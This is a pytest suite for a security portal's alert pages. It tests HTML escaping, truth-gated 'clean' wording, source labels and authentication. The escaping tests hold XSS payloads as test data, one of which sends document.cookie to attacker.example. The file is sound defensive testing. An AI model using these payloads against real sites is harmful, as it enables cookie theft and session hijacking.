"""Alert-partial security and truth-gating tests.

Proves:
  - Malicious alert content (script tags, attribute breakouts) is escaped.
  - "Credentials are clean" is never rendered without a successful HIBP check.
  - "No threats detected" is never rendered without a successful CISA pull.
  - "All systems normal" is never rendered without a successful M365 sync.
  - Last-checked date and source label appear in every panel.
  - Setup-required state shows a clear setup_action.
  - Customer next action is shown.
"""
from __future__ import annotations

import json
import os
import sys
from datetime import datetime, timezone

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ─── Helpers ─────────────────────────────────────────────────


def _login(test_client, fresh_client_manager, client_id="c1", tier="essentials"):
    cm = fresh_client_manager
    cm.create_client(client_id, "Co", "co.com", tier=tier)
    cm.set_portal_password(client_id, "Pass123!")
    token = cm.create_jwt(client_id)
    test_client.cookies.set("portal_token", token)
    return cm


def _save_alert(cm, client_id, alert):
    """Write an alert JSON file directly (mirrors save_alert behavior)."""
    alerts_dir = cm._client_dir(client_id) / "alerts"
    alerts_dir.mkdir(parents=True, exist_ok=True)
    fname = f"{alert.get('date', '2026-04-12')}-{alert.get('type', 'darkweb')}.json"
    (alerts_dir / fname).write_text(json.dumps(alert))


# ─── XSS escaping ────────────────────────────────────────────


XSS_PAYLOAD_TITLE = '<script>alert("xss-title")</script>'
XSS_PAYLOAD_NARRATIVE = (
    '<img src=x onerror="alert(\'xss-narr\')">'
    '<script>document.location="https://attacker.example/?c="+document.cookie</script>'
)
XSS_PAYLOAD_ACTION = '"><script>alert("xss-action")</script>'


def test_darkweb_alert_escapes_malicious_title(test_client, fresh_client_manager,
                                               monkeypatch):
    monkeypatch.setenv("HIBP_API_KEY", "test-key")
    cm = _login(test_client, fresh_client_manager)
    _save_alert(cm, "c1", {
        "type": "darkweb", "severity": "HIGH",
        "title": XSS_PAYLOAD_TITLE,
        "narrative": XSS_PAYLOAD_NARRATIVE,
        "actions": [XSS_PAYLOAD_ACTION, "Force a password reset"],
        "date": "2026-04-12",
    })
    cm.update_field("c1", "last_darkweb_check_at", "2026-04-12")
    resp = test_client.get("/portal/c1/alerts/darkweb")
    assert resp.status_code == 200
    body = resp.text
    # Raw script tags must NOT appear from alert content.
    assert "<script>alert(\"xss-title\")</script>" not in body
    assert "<img src=x onerror=" not in body
    assert "<script>document.location" not in body
    # Escaped form must appear instead.
    assert "&lt;script&gt;alert(&#34;xss-title&#34;)&lt;/script&gt;" in body \
        or "&lt;script&gt;alert(\"xss-title\")&lt;/script&gt;" in body


def test_threat_alert_escapes_malicious_threats_list(test_client,
                                                    fresh_client_manager):
    cm = _login(test_client, fresh_client_manager)
    _save_alert(cm, "c1", {
        "type": "threat", "severity": "HIGH",
        "title": "Threats found",
        "narrative": "Several CVEs",
        "threats": [
            {"cve_id": "CVE-2026-1111",
             "name": '<script>alert("xss-threat")</script>'},
        ],
        "date": "2026-04-12",
    })
    resp = test_client.get("/portal/c1/alerts/threats")
    assert resp.status_code == 200
    assert '<script>alert("xss-threat")</script>' not in resp.text
    assert "&lt;script&gt;alert(" in resp.text


def test_vulns_alert_escapes_malicious_findings(test_client, fresh_client_manager,
                                                monkeypatch):
    # Force "connected" by pretending nuclei is on PATH.
    import shutil
    monkeypatch.setattr(shutil, "which",
                        lambda name: "/usr/bin/nuclei" if name == "nuclei" else None)
    cm = _login(test_client, fresh_client_manager, tier="professional")
    _save_alert(cm, "c1", {
        "type": "vulnscan", "severity": "HIGH",
        "title": "Scan complete",
        "narrative": "Findings to review",
        "findings": [
            {"severity": "HIGH",
             "name": '<svg/onload=alert(1)>',
             "cve_id": "CVE-2026-2222",
             "matched_at": '"><script>alert("xss-match")</script>'},
        ],
        "total": 1,
        "date": "2026-04-12",
    })
    resp = test_client.get("/portal/c1/alerts/vulns")
    assert resp.status_code == 200
    assert "<svg/onload=alert(1)>" not in resp.text
    assert '"><script>alert("xss-match")</script>' not in resp.text
    assert "&lt;svg" in resp.text or "&lt;svg/" in resp.text


def test_monitoring_alert_escapes_anomaly_fields(test_client, fresh_client_manager,
                                                 monkeypatch):
    monkeypatch.setenv("MS_TENANT_ID", "tenant")
    monkeypatch.setenv("MS_CLIENT_ID", "id")
    monkeypatch.setenv("MS_CLIENT_SECRET", "secret")
    cm = _login(test_client, fresh_client_manager)
    _save_alert(cm, "c1", {
        "type": "monitoring", "severity": "MEDIUM",
        "title": "Sign-in anomaly",
        "narrative": "Unusual sign-in",
        "anomalies": [{
            "type": '<script>alert("a-type")</script>',
            "user": '<img src=x onerror=alert(2)>',
            "location": "Lagos",
            "app": "Outlook",
        }],
        "date": "2026-04-12",
    })
    cm.update_field("c1", "last_m365_sync_at", "2026-04-12")
    resp = test_client.get("/portal/c1/alerts/monitoring")
    assert resp.status_code == 200
    assert '<script>alert("a-type")</script>' not in resp.text
    assert "<img src=x onerror=alert(2)>" not in resp.text
    assert "&lt;script&gt;alert(" in resp.text


def test_phishing_alert_escapes_actions(test_client, fresh_client_manager,
                                        monkeypatch):
    monkeypatch.setenv("GOPHISH_API_KEY", "k")
    monkeypatch.setenv("GOPHISH_URL", "https://gophish.local")
    cm = _login(test_client, fresh_client_manager, tier="professional")
    cm.update_field("c1", "employee_emails", ["alice@co.com"])
    _save_alert(cm, "c1", {
        "type": "phishing", "severity": "MEDIUM",
        "title": "Q1 phishing campaign",
        "narrative": "Click rate 8%",
        "actions": ['<script>alert("xss-action")</script>',
                    "Schedule training for repeat clickers"],
        "date": "2026-04-12",
    })
    cm.update_field("c1", "last_phishing_campaign_at", "2026-04-12")
    resp = test_client.get("/portal/c1/alerts/phishing")
    assert resp.status_code == 200
    assert '<script>alert("xss-action")</script>' not in resp.text
    assert "Schedule training" in resp.text


# ─── Truth gates: never claim a clean state without a successful check ─


def test_darkweb_no_clean_claim_without_hibp_key(test_client, fresh_client_manager,
                                                 monkeypatch):
    monkeypatch.delenv("HIBP_API_KEY", raising=False)
    _login(test_client, fresh_client_manager)
    resp = test_client.get("/portal/c1/alerts/darkweb")
    body = resp.text.lower()
    assert "credentials are clean" not in body
    assert "no exposures" not in body
    assert "all clear" not in body
    # Setup-required panel shown.
    assert "pending setup" in body
    assert "haveibeenpwned" in body  # source named


def test_darkweb_first_check_panel_when_key_set_but_no_history(test_client,
                                                              fresh_client_manager,
                                                              monkeypatch):
    monkeypatch.setenv("HIBP_API_KEY", "k")
    _login(test_client, fresh_client_manager)
    resp = test_client.get("/portal/c1/alerts/darkweb")
    body = resp.text.lower()
    assert "credentials are clean" not in body
    assert "first check scheduled" in body
    assert "no successful check on file yet" in body


def test_darkweb_successful_check_no_findings_uses_truth_gated_copy(
    test_client, fresh_client_manager, monkeypatch
):
    monkeypatch.setenv("HIBP_API_KEY", "k")
    cm = _login(test_client, fresh_client_manager)
    cm.update_field("c1", "last_darkweb_check_at", "2026-04-12")
    resp = test_client.get("/portal/c1/alerts/darkweb")
    body = resp.text
    # The phrase "credentials are clean" is forbidden everywhere.
    assert "credentials are clean" not in body.lower()
    # Truth-gated phrasing is present.
    assert "No findings on record from the last successful check." in body
    assert "2026-04-12" in body
    assert "HaveIBeenPwned" in body


def test_threats_no_clean_claim_without_recent_pull(test_client, fresh_client_manager):
    _login(test_client, fresh_client_manager)
    resp = test_client.get("/portal/c1/alerts/threats")
    body = resp.text.lower()
    assert "no relevant threats detected" not in body
    assert "no threats detected" not in body
    assert "first check scheduled" in body
    assert "cisa" in body


def test_threats_truth_gated_when_pull_succeeded(test_client, fresh_client_manager):
    cm = _login(test_client, fresh_client_manager)
    # No threats, but a previous successful pull. We simulate this by
    # writing a low-severity alert dated today (used as last_checked proxy).
    _save_alert(cm, "c1", {
        "type": "threat", "severity": "LOW",
        "title": "Routine pull", "narrative": "No HIGH/CRITICAL.",
        "date": "2026-04-12", "threats": [],
    })
    resp = test_client.get("/portal/c1/alerts/threats")
    body = resp.text
    assert "no threats detected" not in body.lower()
    # Either we have findings with the alert, or we show the truth-gated copy.
    assert ("No findings on record from the last successful check." in body
            or "Routine pull" in body)


def test_monitoring_no_all_systems_normal_without_m365(test_client,
                                                      fresh_client_manager,
                                                      monkeypatch):
    monkeypatch.delenv("MS_TENANT_ID", raising=False)
    monkeypatch.delenv("MS_CLIENT_ID", raising=False)
    monkeypatch.delenv("MS_CLIENT_SECRET", raising=False)
    _login(test_client, fresh_client_manager)
    resp = test_client.get("/portal/c1/alerts/monitoring")
    body = resp.text.lower()
    assert "all systems normal" not in body
    assert "no monitoring anomalies detected" not in body
    assert "pending setup" in body
    assert "microsoft graph" in body


def test_vulns_no_first_scan_marketing_copy(test_client, fresh_client_manager):
    _login(test_client, fresh_client_manager, tier="professional")
    resp = test_client.get("/portal/c1/alerts/vulns")
    body = resp.text.lower()
    # Old marketing line removed — no reference to the 15th of the month.
    assert "first scan runs on the 15th" not in body
    # New panel shows source + state.
    assert "nuclei" in body


def test_phishing_no_first_campaign_marketing_copy(test_client, fresh_client_manager,
                                                   monkeypatch):
    _login(test_client, fresh_client_manager, tier="professional")
    resp = test_client.get("/portal/c1/alerts/phishing")
    body = resp.text.lower()
    assert "first campaign launches next quarter" not in body
    assert "gophish" in body


# ─── Last-checked + source + next-action surface ─────────────


def test_each_panel_shows_source_label(test_client, fresh_client_manager,
                                       monkeypatch):
    """Every alert panel must surface its data source so customers know
    where the answer comes from."""
    cm = _login(test_client, fresh_client_manager, tier="professional")
    expectations = [
        ("/portal/c1/alerts/darkweb", "HaveIBeenPwned"),
        ("/portal/c1/alerts/threats", "CISA"),
        ("/portal/c1/alerts/vulns", "Nuclei"),
        ("/portal/c1/alerts/phishing", "GoPhish"),
        ("/portal/c1/alerts/monitoring", "Microsoft Graph"),
    ]
    for path, source in expectations:
        resp = test_client.get(path)
        assert resp.status_code == 200, path
        assert source in resp.text, f"{path} missing source label '{source}'"


def test_each_panel_shows_cadence(test_client, fresh_client_manager):
    _login(test_client, fresh_client_manager, tier="professional")
    expectations = [
        ("/portal/c1/alerts/darkweb", "Weekly"),
        ("/portal/c1/alerts/threats", "Daily"),
        ("/portal/c1/alerts/vulns", "Monthly"),
        ("/portal/c1/alerts/phishing", "Quarterly"),
        ("/portal/c1/alerts/monitoring", "Daily"),
    ]
    for path, cadence in expectations:
        resp = test_client.get(path)
        assert cadence in resp.text, f"{path} missing cadence '{cadence}'"


def test_setup_required_panel_shows_setup_action(test_client, fresh_client_manager,
                                                 monkeypatch):
    monkeypatch.delenv("HIBP_API_KEY", raising=False)
    _login(test_client, fresh_client_manager)
    resp = test_client.get("/portal/c1/alerts/darkweb")
    assert "Provide a HaveIBeenPwned API key" in resp.text


def test_customer_next_action_present_in_panels(test_client, fresh_client_manager,
                                               monkeypatch):
    monkeypatch.setenv("HIBP_API_KEY", "k")
    cm = _login(test_client, fresh_client_manager)
    cm.update_field("c1", "last_darkweb_check_at", "2026-04-12")
    resp = test_client.get("/portal/c1/alerts/darkweb")
    assert "Next step" in resp.text


# ─── Auth boundary ──────────────────────────────────────────


def test_alert_partials_require_portal_auth(test_client):
    for path in ["/portal/anyone/alerts/darkweb",
                 "/portal/anyone/alerts/threats",
                 "/portal/anyone/alerts/vulns",
                 "/portal/anyone/alerts/phishing",
                 "/portal/anyone/alerts/monitoring",
                 "/portal/anyone/alerts/report"]:
        resp = test_client.get(path)
        assert resp.status_code == 401


def test_one_client_cannot_view_another_clients_alerts(test_app, fresh_client_manager):
    from starlette.testclient import TestClient
    cm = fresh_client_manager
    cm.create_client("c_a", "A", "a.com", tier="essentials")
    cm.create_client("c_b", "B", "b.com", tier="essentials")
    token_a = cm.create_jwt("c_a")
    c = TestClient(test_app, raise_server_exceptions=False)
    c.cookies.set("portal_token", token_a)
    resp = c.get("/portal/c_b/alerts/darkweb")
    assert resp.status_code == 401
